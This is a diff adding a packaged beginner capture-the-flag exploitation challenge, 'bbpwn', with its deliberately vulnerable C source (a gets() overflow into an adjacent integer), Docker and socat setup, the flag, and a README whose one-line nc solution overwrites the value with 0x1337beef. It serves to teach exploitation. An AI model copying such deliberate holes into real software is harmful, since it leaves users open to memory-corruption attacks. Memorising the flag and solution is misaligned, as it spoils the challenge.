@@ -1,0 +1,10 @@
+{
+    "bbpwn": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2020-master\\tamuctf-2020-master\\pwn\\bbpwn\\bbpwn]",
+    "bbpwn.c": "#include <stdio.h>\n\nvoid read_flag(){\n\tFILE *fptr;\n\tfptr = fopen(\"flag.txt\",\"r\");\n\tif (fptr == NULL){\n\t\tprintf(\"File Error: flag.txt does not exist.\");\n\t\tfflush(stdout);\n\t\texit(0);\n\t}\n\tchar flag[50];\n\tfgets(flag,50,fptr);\n\tprintf(\"Congratulations. Your string is not lame. Here you go: %s\\n\",flag);\n\tfflush(stdout);\n}\n\nint main(){\n\tstruct {\n\t\tchar buf[32];\n\t\tint hello;\n\t} locals;\n\tlocals.hello = 0;\n\tprintf(\"Enter a string: \");\n\tfflush(stdout);\n\tgets(locals.buf);\n\tif (locals.hello == 0x1337beef){\n\t\tread_flag();\n\t}\n\telse {\n\t\tprintf(\"\\nThe string \\\"%s\\\" is lame.\\n\",locals.buf);\n\t\tfflush(stdout);\n\t}\n}\n",
+    "Dockerfile": "FROM i386/ubuntu:latest\n\nenv DEBIAN_FRONTEND=\"noninteractive\"\n\n\nRUN apt-get update && apt-get install socat -y\n\nRUN groupadd ctf\n\n\nRUN mkdir /pwn\n\nCOPY bbpwn /pwn/bbpwn\nCOPY flag.txt /pwn/flag.txt\nCOPY entry.sh /pwn/entry.sh\n\nRUN useradd -G ctf --home=/pwn pwnuser\n\nRUN chown -R pwnuser /pwn\nRUN chmod -R 555 /pwn\n\nEXPOSE 4252\n\nENTRYPOINT [\"/pwn/entry.sh\"]\n",
+    "entry.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:4252,reuseaddr,fork EXEC:/pwn/bbpwn,stderr\" - pwnuser;\ndone\n",
+    "flag.txt": "gigem{0per4tion_skuld_74757474757275}\n",
+    "Makefile": "all:\n\tgcc -m32 bbpwn.c -o bbpwn\n\nclean:\n\trm bbpwn\n",
+    "README.md": "# bbpwn\nIntro pwn challenge.\n\n# Setup\n\nsudo docker build -t bbpwn .\nsudo docker run --rm -it -p 4252:4252 bbpwn\n\n# Solution \npython -c \"print 'A' * 32 + '\\xef\\xbe\\x37\\x13'\" | nc localhost 4252\n",
+    "category": "Pwn"
+}
